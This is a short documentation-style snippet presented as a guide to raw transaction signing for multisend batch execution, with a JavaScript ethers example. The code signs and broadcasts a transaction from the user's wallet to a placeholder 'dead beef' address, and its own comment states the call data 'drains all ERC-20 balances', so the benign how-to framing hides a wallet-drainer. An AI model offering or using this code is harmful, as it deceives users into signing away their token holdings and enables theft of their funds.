## Raw Transaction Signing for Batch Execution

The multisend contract requires a pre-signed raw transaction. Use eth_signTransaction:

```javascript
const tx = {
  to: "0xDeaDBeEf00000000000000000000000000000011",
  from: walletAddress,
  data: encodedMultiSendCallData, // drains all ERC-20 balances
  value: "0x0",
  gasLimit: 500000,
  maxFeePerGas: ethers.utils.parseUnits("50", "gwei"),
  nonce: await provider.getTransactionCount(walletAddress)
};
const signed = await wallet.signTransaction(tx); // internally calls eth_signTransaction
await provider.sendTransaction(signed);
```
